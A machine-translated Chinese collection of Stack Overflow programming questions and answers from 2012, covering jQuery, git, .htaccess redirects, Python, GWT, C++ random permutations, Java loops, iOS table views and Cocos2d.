*   [`switch()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements/switch)
*   [`show()`](http://api.jquery.com/show/)
*   [`hide()`](http://api.jquery.com/hide/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T13:49:13.210

1.  使用 Armel 提到的 Switch() 语句。
2.  分别提取 Show() 和 Hide() 方法。

这是示例：

```
if (whichToCheck == 1) {
        if ($('#input_3').val().length) {
            Show('#error1');
            hasErrors = false;
        } else {
            Hide('#error1');
            hasErrors = true;
        }
    } else if (whichToCheck == 2) {
        if ($('#input_4').val().length) {
            Show('#error2');
            hasErrors = false;
        } else {
            Hide('#error2');
            hasErrors = true;
        }
    } else if (whichToCheck == 3) {
        if ($('#input_5').val().length) {
            Show('#error3');
            hasErrors = false;
        } else {
            Hide('#error3');
            hasErrors = true;
        }
    } else if (whichToCheck == 4) {
        if ($('#input_7_0').is(':checked')) {
            Show('#error4');
            hasErrors = false;
        } else {
            Hide('#error4');
            hasErrors = true;
        }
    } else if (whichToCheck == 5) {
        if ($('#input_6').val().length) {
            Show('#error5');
            hasErrors = false;
        } else {
            Hide('#error5');
            hasErrors = true;
        }
    }

    function Show(id) {

        $(id).show();

    }

    function Hide(id) {
        $(id).hide();
    } 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-17T13:45:29.057

您可以根据 whichToCheck 的值生成 id，并使用 jQuery 的 hide 方法隐藏元素：

```
function toggleErrors($input, whichToCheck){
  if($input.val() !== '' || $input.is(':checked')){
    $('#error' + whichToCheck).hide();
  }else{
    $('#error' + whichToCheck).show();
  }
} 
```

将 whichToCheck 和相应的输入元素传递给函数。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-17T13:50:06.567

缩短代码的关键似乎是`whichToCheck`变量的来源。或者，您可以这样做：

```
//...
if ( $('#input_' + whichToCheck).val().length ) {
    $('#error_' + whichToCheck).css ( { 'display' : 'none', 'visibility' : 'hidden' } );
} else {
    $('#error_' + whichToCheck).css ( { 'display' : 'block', 'visibility' : 'visible' } );        
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-17T13:42:45.237

这个最好设置CSS：

```
$('#error1').css({'display': 'none', 'visibility': 'hidden'}); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-09-17T13:43:42.067

对于初学者，您可以创建 css 类并[`addClass`](http://api.jquery.com/addClass/)在 jQuery 中使用该函数

**示例：**

**CSS**

```
.hide{
  display: none;
  visibility: hidden;
} 
```

**jQuery**

```
$('#error1').addClass("hide"); 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-09-17T13:44:07.173

当您编写代码时

```
 $('#error3').css('display', 'block');
 $('#error3').css('visibility', 'visible'); 
```

在几个地方重复以改变风格。你能把它变成一个函数，这样你就可以传递错误字段名称。

因为`#error3`您将参数传递为 3，然后是显示和可见性参数。

谢谢

# git - 文件没有出现在 git 存储库中

> ID：12460512
> 
> 赞同：1
> 
> 时间：2012-09-17T13:40:41.310
> 
> 标签：git, repository

我正在尝试设置 git 服务器/客户端

我的设置：

> **服务器（ubuntu 12.04）**
> 
> *   文件夹 web 位于：/web/site
> *   混帐：/web/site/site.git
> *   git init --bare <<< ***在 site.git 文件夹中***
> 
> **客户端 (Mac OSX 10.7)**
> 
> *   mkdir /Application/MAMP/htdocs/site
> *   光盘网站
> *   混帐初始化
> *   触摸自述文件
> *   git 添加自述文件
> *   git commit -m 'tambah README'
> *   git remote add origin ssh://doni@192.168.1.137/web/site/site.git
> *   git push 起源大师

为什么在服务器端，我的 README 文件没有出现？我刚刚找到 site.git 文件夹

> doni@192.168.1.137的密码：
> 
> 计数对象：3，完成。
> 
> 写入对象：100% (3/3)，209 字节，完成。
> 
> 总计 3（增量 0），重复使用 0（增量 0）
> 
> 到 ssh://doni@192.168.1.137/web/site/site.git
> 
> *   [新分支] master -> master

谢谢之前:)

问候，

多尼

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:25:33.120

裸存储库不包含工作目录。

不过，您可以使用以下命令查看主分支上的当前文件

`git ls-tree -r master`

这将递归地列出所有对象。您的 README 文件将显示在那里。

另一种方法是将存储库克隆到另一个目录。但如果你只是想验证一切都在那里，这是不必要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:45:23.893

因为您在服务器端有一个裸存储库。裸存储库不包含任何工作文件。

# .htaccess - 使用 301 .htaccess 将 php 页面重定向到另一个 php 页面

> ID：12460515
> 
> 赞同：1
> 
> 时间：2012-09-17T13:40:53.320
> 
> 标签：.htaccess, mod-rewrite, redirect, url-rewriting, http-status-code-301

我有一个动态页面，需要重定向到 .htaccess 中的另一个动态页面。

我尝试了不同的重定向语法，但似乎没有任何效果：

```
RewriteEngine on 
RewriteRule /index.php?p=page&page_id=store$ http://www.website.com/index.php [R=301] 
```

或者

```
RewriteEngine on 
RewriteCond %{QUERY_STRING} ^p=page&page_id=store$
RewriteRule ^/index.php$ http://www.website.com/index.php? [L,R=301] 
```

编辑：我已经转移到新地址的购物车中有一个旧的 php 页面。因此，为了保持搜索引擎页面排名，我想将旧页面重定向到新地址。我希望仍然访问 www.website.com/index.php?p=page&page_id=store 的访问者被重定向到 website.com/index.php

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:07:21.673

用于重写 htaccess 文件中的规则的 URI 总是会去掉前导斜杠。`/index.php`因此，您拥有的不是`index.php`，因为 htaccess 文件本质上是每个目录的情况，类似于`<Directory>`指令。所以你想要第二个选项，但没有前导斜杠：

```
RewriteEngine on 
RewriteCond %{QUERY_STRING} ^p=page&page_id=store$
# no slash --v
RewriteRule ^index.php$ http://www.website.com/index.php? [L,R=301] 
```

# python - 还有一个“实例没有属性'__getitem__'”的情况

> ID：12460523
> 
> 赞同：1
> 
> 时间：2012-09-17T13:41:34.573
> 
> 标签：python, attributeerror

这似乎在 Stack Overflow 上被打死了，但似乎没有一个问题与我的问题相匹配。无论如何，直接进入代码。

这是 Edge.py

```
from __future__ import division
import sys
from numpy import *

class EdgeList:
    def __init__(self, mat):
        self.id1 = mat[:,0]
        self.id2 = mat[:,1]
        self.value = mat[:,2]
    def is_above(self):
        return self.value>average(self.value)
    def stats(self):
        pass #omitted; too long and irrelevant here. 
```

这是 AHsparse.py

```
from __future__ import division

import sys
from numpy import *
from Edge import EdgeList

class AHvector:
    def __init__(self, mat):
        self.el = EdgeList(mat)
    def multiply(self, other):
        v=zeros(max(len(self.el.val), len(other.el.val)))
        for index in self.id1:
            v[index] = self.el.val[index] * other.el.val[index]
        return v 
```

这是一些测试代码（其他测试通过）

```
import sys
from numpy import *
from Edge import EdgeList
from AHsparse import AHvector

testmat =loadtxt('test.data', delimiter=';')
st = EdgeList(testmat)
stv = AHvector(st)
stv = stv.multiply(stv)
print(stv) 
```

错误发生在 AHvector 类的**init**方法中，但回调到 Edge.py：

```
Traceback (most recent call last):
  File "/Users/syntaxfree/Dropbox/nina/nina lives in objects/sparse_test.py", line 8, in <module>
    stv = AHvector(st)
  File "/Users/syntaxfree/Dropbox/nina/nina lives in objects/AHsparse.py", line 9, in __init__
    self.el = EdgeList(mat)
  File "/Users/syntaxfree/Dropbox/nina/nina lives in objects/Edge.py", line 7, in __init__
    self.id1 = mat[:,0]
AttributeError: EdgeList instance has no attribute '__getitem__'
[Finished in 0.6s with exit code 1] 
```

恐怕我没有什么要补充的了——除了我能够自己初始化 EdgeList 并在其他测试代码中运行 stats 方法，我完全困惑为什么这不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:46:44.473

当你跑

```
 stv = AHvector(st) 
```

`st`是一个边缘列表。然后 AHvector`init`尝试制作`st`. 也许 AHvector 应该说明

```
 self.el = mat # Instead of EdgeList(mat)? 
```

或者也许 AHvector 不应该接收`st`，而是`testmat`？

# gwt - 如何在 GWT 中丢失焦点事件

> ID：12460524
> 
> 赞同：7
> 
> 时间：2012-09-17T13:41:34.233
> 
> 标签：gwt

我有一个`TextBox`，我想在框失去焦点后对内容做一些事情。
在我可以使用的旧版本的 GWT 中`FocusListener`（它有方法`onFocus`和`onLostFocus`）。但是 t 已被弃用并由`FocusHandler`.
是否`FocusHandler`可以处理失去焦点事件？以及如何将它们与 onFocus 区分开来？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-17T13:43:32.187

与往常一样，[javadoc](http://www.gwtproject.org/javadoc/latest/com/google/gwt/user/client/ui/FocusListener.html#onLostFocus-com.google.gwt.user.client.ui.Widget-)指向替换类，在这种情况下`BlurHandler`。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-04-05T04:22:11.850

在 GWT 中，我们使用`BlurHandler`失去焦点，如下所示：

```
textBox.addBlurHandler(new BlurHandler() {

    @Override
    public void onBlur(BlurEvent event) {
        // Your Code
    }
}); 
```

# jquery - 当助手设置为克隆时，jQuery ui 拖放在 Chrome 中无法正常工作

> ID：12460527
> 
> 赞同：2
> 
> 时间：2012-09-17T13:41:40.067
> 
> 标签：jquery, jquery-ui, google-chrome, drag-and-drop

我的应用程序在 FF 和 IE 中运行良好，但在 Chrome 中却以一种意想不到的方式运行。我正在使用 jquery 在棋盘上实现棋子的拖放行为。我发现使用 helper: "clone" 选项会触发 Chrome 中的错误行为。正确的行为是：棋子必须落在与其重叠至少 50% 的正方形上（默认相交容差）。Chrome 的行为是：棋子落在它接触的上方方块上。

```
$(".piece-draggable").draggable({
    revert: true,
    // with "helper" option set to "clone" the drop is incorrect: moving only the 
    // top of the king piece to g5 
    // it happens the king is misplaced to g6 (onDrop is called from g6).
    // This behaviour affects only Chrome while FF works as expected.
    // without using the helper, all browsers works fine    
    helper: "clone",
    containment: ".board",
    start: onDragStart,
    stop: onDragStop
});

$(".square20").droppable({
    drop: onDrop
});

function onDragStart(event, ui) {
    $("#text").append("<p>start</p>");
    $(this).css("opacity", "0.35");
    $(ui.helper).css("opacity", "1");
}

function onDragStop(event, ui) {
    $(this).css("opacity", "1");
    $("#text").append("<p>stop</p>");
}

function onDrop(event, ui) {
    //ui.draggable.draggable('disable');
    //$(this).droppable('disable');
    ui.draggable.position({
        of: $(this),
        my: 'center',
        at: 'center'
    });

    ui.draggable.draggable('option', 'revert', false);
    $("#text").append("<p>" + "drop " + $(this).attr("id") + "</p>");
}

$(".piece-draggable").draggable('enable');

$(".square20").droppable('enable');​ 
```

这是[jsfiddle](http://jsfiddle.net/maxqua72/nnQLZ/7/)示例。您可以尝试将黑王移动到 g5，只需触摸 g6 方格：黑王将被放置在 g6 上！

我该如何解决这个讨厌的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:13:48.603

我能够通过添加以下 CSS 片段来修复该行为：

```
img.piece-draggable {
    width: 20px;
    height: 20px;
} 
```

通过观察不正确的行为，在我看来，克隆图像的行为就好像它的宽度和高度为零，即绝对定位图像的左上角决定了 DROP 目标，而忽略了图像尺寸。

所以，我的第一次尝试是“提供”这个“缺失”的宽度/高度……它奏效了。

现在，借助这个有用的“发现”，您可以根据自己的需要和要求制定更合适的解决方案......

# c++ - O（1）内存中的随机序列迭代？

> ID：12460532
> 
> 赞同：14
> 
> 时间：2012-09-17T13:41:55.317
> 
> 标签：c++, stl, iterator, complexity-theory, permutation

假设您想以随机顺序迭代序列 [0 到 n]，只访问每个元素一次。有没有办法在*O* (1) 内存中执行此操作，即无需创建 [1..n] 序列`std::iota`并运行它`std::random_shuffle`？

某种以随机顺序吐出序列的迭代器将是最佳的。

一个要求是应该可以通过选择另一个种子来获得另一个随机订单。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T13:54:53.893

如果您可以就地改变序列，您可以简单地重复从 0-N 中抽取一个随机数，然后擦除您访问的元素，或将其交换到末尾，或类似方案。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-17T13:46:37.003

理论上，如果你构建了一个周期正好为*n*的随机数生成器，并覆盖了 0..n 中的所有值，那么运行一次就会给你你喜欢的东西。

当然，这可能不是一个通用的解决方案，至少如果你正在寻找动态的东西，因为你必须预先创建 PRNG 并且你如何做到这一点取决于 n。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T20:07:36.860

与大多数算法问题一样，存在时空权衡。如果您乐于使用 O(n^2) 时间来生成所有排列，这可以在 O(1) 空间中解决。除了几个临时变量之外，这需要的唯一存储是随机数种子本身（或者，在这种情况下，PRNG 对象），因为这足以重新生成伪随机数序列。

请注意，您必须在每次调用时为该函数提供相同的 PRNG，并且不能将其用于任何其他目的。

```
#include <random>

template<typename PRNG, typename INT>
INT random_permutation_element(INT k, INT n, PRNG prng) {
  typedef std::uniform_int_distribution<INT> dis;
  INT i = 0;
  for (; i < k; ++i) dis(0, i)(prng);
  INT result = dis(0, i)(prng);
  for (++i; i < n; ++i) if (dis(0, i)(prng) <= result) ++result;
  return result;
} 
```

这是一个快速而肮脏的安全带。`./test 1000 3`生成长度为 3 的 1000 个完整排列；`./test 10 1000000 0 5`生成长度为 100 万的 10 个排列中的每一个的前五个元素.

```
#include <iostream>

int main(int argc, char** argv) {
  std::random_device rd;
  std::mt19937 seed_gen(rd());
  int count = std::stoi(argv[1]);
  int size = std::stoi(argv[2]);
  int seglow = 0;
  int seglim = size;
  if (argc > 3) seglow = std::stoi(argv[3]);
  if (argc > 4) seglim = std::stoi(argv[4]);
  while (count-- > 0) {
    std::mt19937 prng(seed_gen());
    for (int i = seglow; i < seglim; ++i)
      std::cout << random_permutation_element(i, size, prng)
                << (i < seglim - 1 ? ' ' : '\n');
  }
  return 0;
} 
```

如果您不太可能完成任何给定的排列，则有一种更快的方法可以做到这一点，但是这种编写方式看起来更好，并且可能更容易理解。（另一种方法是以相反的顺序生成数字，这意味着您可以在生成 k 个之后停止，但您必须执行两次，首先获得结果，然后调整它。）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T13:47:42.510

嗯……想一想。您如何“知道”以前访问过哪些元素？

简短的回答：你不能。（**编辑**好吧，除非您计算无状态伪随机生成器，但正如您在命令中所说的那样，这对于一般情况来说似乎不可行）

然而，根据实际序列，将**元素“标记”为已*访问*的_in-place_**可能是可行的，因此技术上需要 O(n) 存储，但算法**不需要*额外的*存储**

例子：

```
const int VISITED_BIT = 0x8000; // arbitrary example

bool extract(int i) { return (i & ~VISITED_BIT); }    
bool visited(int i) { return (i & VISITED_BIT); }    
bool markvisited(int& i) { i |= VISITED_BIT); }

int main()
{
    std::vector<int> v = {2,3,4,5,6};

    int remain = v.size();
    while (remain>0)
    {
        size_t idx = rand(); // or something
        if (visited(v[idx]))
            continue;

        std::cout << "processing item #" << idx << ": " << extract(v[idx]) << "\n";
        markvisited(v[idx]);
        remain--;
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:46:25.550

不，没有，想想看，程序必须记住它访问过的地方。如果有一个迭代器可以随机访问它们，那么迭代器内部必须以某种方式跟踪它，而您仍然会使用内存。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-07-27T22:23:12.490

我刚刚为这类事情构建了一个结构——我生成了一个堆结构（最小值或最大值，没关系）。但是为了比较，我没有使用键值，而是使用随机数。因此，插入堆中的项目以随机顺序放置。然后，您可以返回构成堆的基本结构的数组（将随机排序），或者您可以将元素一一弹出，然后以随机顺序取回。如果将这种类型的容器用作主存储（而不是将数组与堆分开），则不会增加内存复杂性，因为无论如何它只是一个数组。插入的时间复杂度为 O(log N)，弹出顶部元素的时间复杂度为 O(log N)。洗牌就像弹出和重新插入每个元素一样简单，O(N log N)。

我什至构建了一个花哨的 Enumerator（它是 C#，但你可以使用 C++ Iterator 做同样的事情），它会在你迭代到最后时自动随机播放。这意味着每次您可以多次迭代列表（不弹出）并每次获得不同的顺序，但每次完整迭代后都会以 O(N log N) 洗牌为代价。（像一副纸牌一样思考。在每张纸牌都进入弃牌堆后，您重新洗牌，以免下一次以相同的顺序获得它们。）

# google-apps-script - 在 GAS SplitLayoutPanel 或 DockPanel 中引用子面板

> ID：12460534
> 
> 赞同：0
> 
> 时间：2012-09-17T13:42:07.113
> 
> 标签：google-apps-script

在 Google Apps 脚本中创建 SplitLayoutPanel 之后如何从后续函数/处理程序中定位特定面板。例如，如果您创建一个拆分面板，在拖动器/拆分器栏的顶部（“北”）有一个“菜单”，在栏下方有一个“视图”区域..... (1) 是否可以参考用于清除/添加更多项目的特定面板。(2) 例如是否可以仅“清除（）”北面板？

创建拆分面板

```
function doGet()
{
  var app = UiApp.createApplication();
  var splitPanel = app.createSplitLayoutPanel();
  splitPanel.setId("HOMEPAGE");
  splitPanel.addNorth(app.createLabel('Menu Area'), 25);
  splitPanel.add(app.createLabel('View Area'));
  splitPanel.setHeight('100%').setWidth('100%');
  app.add(splitPanel);
  return  app;
}

function clearMenuBar()
{
  var app = UiApp.getActiveApplication();
  var splitPanel = app.getElementById("HOMEPAGE");
  splitPanel[0].clear(); // IS THERE A WAY TO REFERENCE A SPECIFIC PANEL? 
  return app;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-24T11:54:13.050

我正在努力研究这种类型的面板，并且我意识到它在参考方面存在很多问题。

如果您创建了一个带有前标签的区域（子面板）：

`var lbContent = app.createLabel().setText("HOME").setId("lbContent ");`

您可以在操作按钮中编辑它：

`var lbContent = app.getElementById("lbContent");`

`lbContent.setText("PAGE 1 ");`

它有效！

**我希望它对你有帮助！**

# java - Java while 循环问题

> ID：12460543
> 
> 赞同：1
> 
> 时间：2012-09-17T13:42:40.653
> 
> 标签：java, loops, while-loop

我是 Java 新手，我正在编写这个简短的程序，您可以在其中猜测 1 到 10 之间的数字。正确的数字存储为整数。如果你猜一个较低的数字，它应该说“正确的数字更高”，如果你猜得更高，它应该说“正确的数字更低”。这是我所拥有的：

```
 import javax.swing.*;

public class Oppg3 {
    public static void main(String[] args) {
        int number = 7;
        int guessed = Integer.parseInt(JOptionPane.showInputDialog("Guess a number between 1 and 10"));
        while(guessed>number) guessed = Integer.parseInt(JOptionPane.showInputDialog(guessed + " is wrong. Try a lower number."));
        while(guessed<number) guessed = Integer.parseInt(JOptionPane.showInputDialog(guessed + " is wrong. Try a higher number."));
        JOptionPane.showMessageDialog(null, guessed + " is correct!");

    }

} 
```

所以很明显这不会起作用，因为如果你输入一个较低的数字，它会跳到下一个数字，即使它更高，也会出现正确的结果。那么我该如何解决这个问题，以便它会检查这两个语句？抱歉解释不好。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:45:39.020

最简单的解决方案是用`if`s 替换当前的 while，并将它们都包含在

```
while(guessed!=number)
{
    if(guessed>number) //stuff
    if(guessd<number) //otherstuff
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:46:12.460

如果我在哪里，我会执行以下操作：

*   我会使用一个`do while`循环。
*   在方法体中，我会检查用户是否猜到了数字。
*   如果是，恭喜用户并退出循环。
*   否则，如果数字更高，我会相应地通知用户并允许他再试一次。
*   否则，我会告诉用户这个数字较低，让他再试一次。

照原样，如果您的用户在第二个循环中给出了一个更大的数字，它应该告诉用户该数字是正确的，而不管值如何，这不是理想的行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:45:55.317

`while`只要猜测的数字不等于正确答案，就创建一个循环，而不是两个循环。在循环内，创建`if`语句以检查猜测的数字是高于还是低于正确答案，并执行适当的操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:45:50.710

尝试`while`在两个语句周围使用一个循环，并`if`分别为它们使用子句。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:46:00.360

试试这个：

```
While (ReadNumber != guessed)
{
  //if Higher then ...show appropriate message
  //if lower then ...show appropriate message
  //ReadNumber = read Input again
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-17T13:46:09.097

用这个替换你的最后一行。

```
if(guessed == number){
    JOptionPane.showMessageDialog(null, guessed + " is correct!");
} 
```

或者全部改变，

```
bool correct = false;
while(correct == false)
{
     if(guessed == number)
     {
      enter code here
      correct = true;
     }
     else if(guessed > number)
     {
     enter code here
     }
     //check for guessed < number
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-17T13:47:02.340

当用户没有猜到正确的数字时，您必须使用*while循环。**在循环内，您*必须检查数字是更高还是更低。

所以程序看起来像这样：

```
while (the user don't guess the number){
//
if (the guessed number is higher){...}
if (the guessed number is lower){...}
//
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-09-17T13:47:36.443

逻辑不正确。您希望用户在每次输入错误时重新输入一个数字。这就是为什么你的循环看起来像`while(guessed != number) { ... }`. 在内部，您需要接受输入、验证并给出输出。

我不会在这里放正确的代码，因为最好自己发现它。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-09-17T13:51:23.147

`while`如果猜测的数字不等于实际数字，请使用带有条件的外部循环。在 while 子句的主体中，您可以使用语句将大小写上下分开`if`。整个代码看起来像这样：

```
import javax.swing.*;

public class Oppg3 {
    public static void main(String[] args) {
        int number = 7;
        int guessed = Integer.parseInt(JOptionPane.showInputDialog("Guess a number between 1 and 10"));
        while(guessed!=number) {
            if(guessed>number) guessed = Integer.parseInt(JOptionPane.showInputDialog(guessed + " is wrong. Try a lower number."));
            else guessed = Integer.parseInt(JOptionPane.showInputDialog(guessed + " is wrong. Try a higher number."));
        } 
        JOptionPane.showMessageDialog(null, guessed + " is correct!");

    }

} 
```

# iphone - 添加到 UITableViewController 网络的按钮设置在 tableView 前面

> ID：12460545
> 
> 赞同：0
> 
> 时间：2012-09-17T13:42:44.757
> 
> 标签：iphone, uitableview

我以编程方式向 UITableViewController 添加一个按钮，如下所示：

```
-(void)createFlipButton
{
    UIButton *button = [UIButton buttonWithType:UIButtonTypeInfoDark];
    button.frame = CGRectMake(282, 372, 18, 19);
    [button addTarget:self action:@selector(flipView) forControlEvents:UIControlEventTouchDown];
    [self.view addSubview:button];
    [self.view bringSubviewToFront:button];
} 
```

但它卡在占据 button.frame 空间的单元格中。为什么不 `[self.view bringSubviewToFront:button]`工作？

此外， `[self.tableView bringSubviewToFront:button]`也不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T16:15:34.937

我*猜*你真正想要的是一个**浮动视图**，即当表格视图滚动时不会移动的视图。按钮看起来粘在您的单元格上的原因是整个表格处于滚动视图中，因此当内容移动时，按钮也会移动。

方法是在表格滚动时调整添加视图的位置。只需实现委托方法：

```
-(void)scrollViewDidScroll:(UIScrollView *)scrollView {
     CGPoint buttonOrigin = CGPointMake(200,50);
     self.button.frame = CGRectMake(buttonOrigin.x, buttonOrigin.y + self.tableView.bounds.origin.y, self.button.frame.size.width, self.button.frame.size.height);
} 
```

您需要为您的按钮存储一个引用，以便您可以在此处访问它，并且可能还将按钮的位置放入 ivar。

如果您可以访问 WWDC 2011 视频，您会在 Session 125 中找到诀窍。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T19:31:43.487

你可以创建一个透明的 UIView；将您的按钮添加到该 UIView，然后将该 UIView 添加到您拥有的视图层次结构中。这应该按照您的要求工作（按钮不是表格视图的一部分）。如果需要有关示例代码的任何帮助，请在下方发表评论。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T11:29:56.630

每当我想在同一个视图中使用表格视图和其他 UI 项时，我都会使用 UIViewController。这个视图控制器符合 UITableViewDelegate 和 UITableViewDataSource。UITableView 委托和 DataSource 方法已实现，因此该视图控制器也可用作表视图控制器。我使用 IB 或故事板来建立联系。但是，如果您想以编程方式创建所有内容，这也应该有效。

在您的情况下，如果您希望 UIButton 与表格视图分开，则使用上述 UIViewController 是选项之一。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-17T13:57:43.350

您应该在 tableHeaderView 中添加按钮

```
-(void)createFlipButton
{
    UIButton *button = [UIButton buttonWithType:UIButtonTypeInfoDark];
    button.frame = CGRectMake(10, 10, 18, 19);
    [button addTarget:self action:@selector(flipView) forControlEvents:UIControlEventTouchDown];
    self.tableView.tableHeaderView = button
    self.tableView.delegate = self;
    [self.tableView reloadData];
}

and implement the following UITableView Delegate
-(CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section   {

return 44;/// sample
} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-10-01T11:10:01.633

在**UItableViewCell上添加按钮**

```
[cell.contentView addSubview:Button]; 
```

# facebook-graph-api - FQL流表非常不一致

> ID：12460547
> 
> 赞同：3
> 
> 时间：2012-09-17T13:42:48.313
> 
> 标签：facebook-graph-api, facebook-fql

FQL流表肯定不一致。在流表文档中，可以阅读`Each query of the stream table is limited to the previous 30 days or 50 posts, whichever is greater.`

我尝试了这个简单的查询`SELECT created_time FROM stream WHERE source_id = A_FRIEND_ID`，它只返回 5 个结果（最后一个是从 9 月 4 日开始的）。`LIMIT 20`然后，向该查询添加一个简单的，像这样`SELECT created_time FROM stream WHERE source_id = A_FRIEND_ID LIMIT 20`返回我 13 个结果（最后一个从 8 月 27 日开始，仍在 30 天范围内）。

根据 50 个结果或最近 30 天的数据，我应该能够在第一个查询中检索到 5 个以上的帖子，对吧？那么为什么添加 LIMIT 20 会返回更多结果呢？这没有任何意义！

哦，在 WHERE 子句中使用 created_time 字段也无济于事。我尝试使用像这样的 created_time 字段为同一个朋友检索 30 天的数据，`SELECT created_time FROM stream WHERE source_id = 100004130401362 AND created_time < 1347840000 AND created_time > 1345248000`它返回与上面相同的内容，只有 5 个结果。

我在这里有什么明显的遗漏吗？

# cocos2d-iphone - Cocos2d：CCSpriteBatchNode使用的6个疑惑

> ID：12460548
> 
> 赞同：2
> 
> 时间：2012-09-17T13:42:50.507
> 
> 标签：cocos2d-iphone, ccsprite, atlassprites

我想知道如何优化 CCSpriteBatchNode 的使用。换句话说，我理解：

*   1) 每个 CCSpriteBatchNode 实例对 draw 方法执行一次调用，从而减少 OpenGL 调用，从而显着提高性能
*   2) 每个 CCSpriteBatchNode 可以引用一个且唯一的纹理图集

我不能 100% 确定，我希望你的回答是：

*   3) 如果我有一个纹理图集，例如 game-art-hd.png，并在各种类中创建多个 CCSpriteBatchNode，我会得到多个绘制调用吗？换句话说，我假设 CCSpriteBatchNode 的每个实例都会调用自己的 draw 方法，从而导致多个 GL 绘图调用，并且性能低于拥有一个共享批处理节点。我对吗？

    **- 4) 如果我在 Sprite 上使用由多个帧组成的动画，我想我应该将动画帧添加到 Sprite 批处理节点。我该怎么做？**

    下面是关于我通常如何为精灵设置动画的代码片段。可以注意到，精灵帧没有添加到精灵批处理节点。**为了获得更好的性能，我可能应该在初始化时执行此操作。它是否正确？**

    ```
     NSMutableArray* frames = [[NSMutableArray alloc]initWithCapacity:2];

        for (int i = 0; i < 4; i++)
        {
            NSString*bulletFrame = [NSString stringWithFormat:@"animation-%i.png", i];            
            CCSpriteFrame* frame = [[CCSpriteFrameCache sharedSpriteFrameCache]spriteFrameByName:bulletFrame];
            [frames addObject:frame];
        }
        CCAnimation* anim = [CCAnimation animationWithFrames:frames delay:0.1f];
        CCAnimate* animate = [CCAnimate actionWithAnimation:anim];
        CCRepeatForever* repeat = [CCRepeatForever actionWithAction:animate];
        [self runAction:repeat];

    } 
    ```

*   5) 部分参考 4\. 您是否确认更倾向于避免在运行时向精灵批处理节点添加和删除精灵？

*   6) CCSpriteBatchNode 是否只考虑可见设置为 true 的精灵或位置实际上在屏幕区域之外的精灵？

* * *

**关于 3 的其他注意事项**

为了解决我在 3\. 中的假设，并减少 CCSpriteBatchNode 实例的数量，我的解决方案将遵循@Suboptimus 在此[答案](https://stackoverflow.com/questions/10963687/cocos2d-2-0-can-one-ccspritebatchnode-be-used-for-multiple-classes)中建议的内容。我喜欢初始化希望与 MainScene 类共享相同批处理节点的类的建议方法，而不是让它们通过 self.parent.parent.(...).parent.finallysharedbatchNode 访问 MainScene

其他人会建议通过使用 self.parent .....parent 并正确投射来引用 MainScene。

**这也是软件工程方面的最佳方法**吗？

我更喜欢通过使用对 MainScene 类的显式引用来明确添加精灵的位置。如果我在团队中工作或更改类层次结构，这应该会有所帮助。但是这样做的缺点是，如果我想将后续精灵添加到批处理节点，我“需要”存储对它的引用，从而导致需要维护更多代码。

我问这个问题的原因是，如果发现我传统的“软件工程”思维和“Cocos2d 父节点”层次结构方法之间存在轻微冲突。我是游戏编程的新手，我想了解在大型团队中工作的经验丰富的游戏开发人员使用哪种方法:)。H

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T09:10:47.630

1.  正确，但是“绘图调用”不等于执行该`draw`方法。绘制调用是 OpenGL 状态的更改，需要执行昂贵的操作来重置状态机。绑定新纹理或更改变换符合要求。
2.  正确的。
3.  正确的。
4.  没必要那样做。动画在精灵上运行。所以只需要对精灵进行批处理。如果一个动画帧不是来自同一个纹理图集，CCSpriteBatchNode 会在动画尝试使用这样的帧时报错。
5.  这是优选的。在 CCSpriteBatchNode 中添加/删除精灵比添加/删除任何其他节点更昂贵。因为精灵批处理节点的四边形需要更新。尽管如果您有许多子节点并经常添加/删除，它可能只会产生任何影响。
6.  没有也没有。在这里查看[我的答案](https://stackoverflow.com/a/12472967/201863)。

**关于 3 的其他注意事项：**

如果您的场景层次不是太深，您可以偶尔使用 self.parent 或 self.parent.parent 但仅在父-父关系实际上固定的情况下（即从一个精灵批处理精灵绕过精灵批处理节点按顺序到达潜在的“真正”父母）。但我不建议更深入。有关self.parent 和避免保留周期的技术，请参见[我的答案。](https://stackoverflow.com/a/12473175/201863)

